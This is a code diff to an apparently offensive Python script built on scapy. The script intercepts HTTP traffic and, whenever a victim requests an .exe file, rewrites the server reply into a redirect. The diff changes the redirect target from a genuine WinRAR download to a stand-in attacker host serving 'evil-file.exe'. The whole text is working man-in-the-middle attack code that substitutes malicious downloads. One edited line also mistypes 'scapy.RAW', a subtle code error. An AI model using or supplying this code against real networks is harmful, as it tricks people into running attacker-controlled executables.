@@ -16,7 +16,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if b".exe" in scapy_packet[scapy.Raw].load:
+            if b".exe" in scapy_packet[scapy.Raw].load and b"000.00.00.00" not in scapy_packet[scapy.RAW].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
@@ -25,7 +25,7 @@ def process_packet(packet):
                 print("[+] Replacing file")
                 modified_packet = set_load(
                     scapy_packet,
-                    "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+                    "HTTP/1.1 301 Moved Permanently\nLocation: https://000.00.00.00/evil-file.exe\n\n"
                 )
 
                 packet.set_payload(bytes(modified_packet))
